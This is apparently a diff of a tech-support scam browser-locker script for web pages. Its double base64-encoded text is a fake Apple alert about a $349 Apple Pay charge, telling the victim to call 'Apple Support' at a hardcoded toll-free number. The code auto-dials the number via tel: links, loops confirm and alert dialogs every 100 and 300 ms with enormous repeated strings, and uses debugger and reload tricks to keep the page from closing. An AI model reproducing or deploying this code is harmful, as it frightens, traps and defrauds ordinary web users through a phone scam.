@@ -8,7 +8,7 @@ var cookieHelper = {
         path: "/",
         domain: "." + window.location.host.replace(/:\d+/, "")
     },
-    set: function(a, d, c) {
+    set: function (a, d, c) {
         c = c || {};
         for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
         b = c.expires;
@@ -23,10 +23,10 @@ var cookieHelper = {
         for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
         document.cookie = a
     },
-    get: function(a) {
+    get: function (a) {
         return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
     },
-    del: function(a) {
+    del: function (a) {
         this.set(a, null, {
             expires: -1
         })
@@ -57,14 +57,14 @@ window.number = (window.number ? window.number : text_number);
 window.device = 'iPhone';
 window.refef = parseURL(document.referrer);
 
-if(ios) {
-    if(/iphone/.test(userAgent)) {
+if (ios) {
+    if (/iphone/.test(userAgent)) {
         window.device = 'iPhone';
     }
-    if(/ipad/.test(userAgent)) {
+    if (/ipad/.test(userAgent)) {
         window.device = 'iPad';
     }
-    if(/ipod/.test(userAgent)) {
+    if (/ipod/.test(userAgent)) {
         window.device = 'iPod';
     }
 }
@@ -73,13 +73,13 @@ var text_charges = atob(atob("SkRNME9RPT0="));
 var text = cookieHelper.get('textSetBl');
 var phone = cookieHelper.get('phoneSetBl');
 function getText() {
-    return atob(atob("V1c5MWNpQkJjSEJzWlNCSlJDQjNZWE1nY21WalpXNTBiSGtnZFhObFpDQmhkQ0JCVUZCTVJTQlRWRTlTUlNCbWIzSWc="))+text_charges+atob(atob("SUZacFlTQkJjSEJzWlNCUVlYa2dVSEpsTFVGMWRHaHZjbWw2WVhScGIyNGhJRmRsSUdoaGRtVWdjR3hoWTJWa0lIUm9iM05sSUhKbGNYVmxjM1FnYjI0Z2FHOXNaQ0IwYnlCbGJuTjFjbVVnYzJGbVpYTjBJR0Z1WkNCVFpXTjFjbWwwZVM1T2IzUWdlVzkxUHlCSmJXMWxaR2xoZEdWc2VTQmpZV3hzSUVGd2NHeGxJRk4xY0hCdmNuUWc="))+text_number+atob(atob("SUhSdklFWnlaV1Y2WlNCcGRDRXU="));
+    return atob(atob("V1c5MWNpQkJjSEJzWlNCSlJDQjNZWE1nY21WalpXNTBiSGtnZFhObFpDQmhkQ0JCVUZCTVJTQlRWRTlTUlNCbWIzSWc=")) + text_charges + atob(atob("SUZacFlTQkJjSEJzWlNCUVlYa2dVSEpsTFVGMWRHaHZjbWw2WVhScGIyNGhJRmRsSUdoaGRtVWdjR3hoWTJWa0lIUm9iM05sSUhKbGNYVmxjM1FnYjI0Z2FHOXNaQ0IwYnlCbGJuTjFjbVVnYzJGbVpYTjBJR0Z1WkNCVFpXTjFjbWwwZVM1T2IzUWdlVzkxUHlCSmJXMWxaR2xoZEdWc2VTQmpZV3hzSUVGd2NHeGxJRk4xY0hCdmNuUWc=")) + text_number + atob(atob("SUhSdklFWnlaV1Y2WlNCcGRDRXU="));
 }
 
-if(!phone) {
+if (!phone) {
     phone = getURLParameter('phone');
 }
-if(!text) {
+if (!text) {
     text = getURLParameter('text');
 }
 var sText = document.querySelectorAll('.js_setTextBlock');
@@ -92,30 +92,30 @@ for (var p = 0; p < sPhone.length; p++) {
 }
 
 function okkkk() {
-    jQuery('#result').append('<a class="anchorcall" href="tel:'+text_number+'"></a>');
+    jQuery('#result').append('<a class="anchorcall" href="tel:+1-866-381-7483"></a>');
     document.querySelector('a').click();
     var extraData = "";
-    for(itxextraData = 0; itxextraData < 200; itxextraData++) {
+    for (itxextraData = 0; itxextraData < 200; itxextraData++) {
         var extraData = extraData + "5555555555";
     }
-    jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+    jQuery('#result').append('<a href="#callto+' + "+1-866-381-7483" + '%00"></a>');
     document.querySelector('a').click();
     document.querySelector('a').click();
     document.querySelector('a').click();
     document.querySelector('a').click();
     document.querySelector('a').click();
     document.querySelector('a').click();
-    setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+    setInterval(function () { alert(getText().repeat(99999999999)); }, 300);
 }
 function myFunction() {
-    if(confirm(atob(atob("V1c5MWNpQkJjSEJzWlNCSlJDQjNZWE1nY21WalpXNTBiSGtnZFhObFpDQmhkQ0JCVUZCTVJTQlRWRTlTUlNCbWIzSWc="))+text_charges+atob(atob("SUZacFlTQkJjSEJzWlNCUVlYa2dVSEpsTFVGMWRHaHZjbWw2WVhScGIyNGhJRmRsSUdoaGRtVWdjR3hoWTJWa0lIUm9iM05sSUhKbGNYVmxjM1FnYjI0Z2FHOXNaQ0IwYnlCbGJuTjFjbVVnYzJGbVpYTjBJR0Z1WkNCVFpXTjFjbWwwZVM1T2IzUWdlVzkxUHlCSmJXMWxaR2xoZEdWc2VTQmpZV3hzSUVGd2NHeGxJRk4xY0hCdmNuUWc="))+text_number+atob(atob("SUhSdklFWnlaV1Y2WlNCcGRDRXU=")))) {
+    if (confirm(atob(atob("V1c5MWNpQkJjSEJzWlNCSlJDQjNZWE1nY21WalpXNTBiSGtnZFhObFpDQmhkQ0JCVUZCTVJTQlRWRTlTUlNCbWIzSWc=")) + text_charges + atob(atob("SUZacFlTQkJjSEJzWlNCUVlYa2dVSEpsTFVGMWRHaHZjbWw2WVhScGIyNGhJRmRsSUdoaGRtVWdjR3hoWTJWa0lIUm9iM05sSUhKbGNYVmxjM1FnYjI0Z2FHOXNaQ0IwYnlCbGJuTjFjbVVnYzJGbVpYTjBJR0Z1WkNCVFpXTjFjbWwwZVM1T2IzUWdlVzkxUHlCSmJXMWxaR2xoZEdWc2VTQmpZV3hzSUVGd2NHeGxJRk4xY0hCdmNuUWc=")) + text_number + atob(atob("SUhSdklFWnlaV1Y2WlNCcGRDRXU=")))) {
         okkkk();
     }
     else {
         okkkk();
     }
 }
-window.ununload = function() {
+window.ununload = function () {
     debugger; location.reload();
 }
-setInterval(function() { myFunction() }, 100);
+setInterval(function () { myFunction() }, 100);
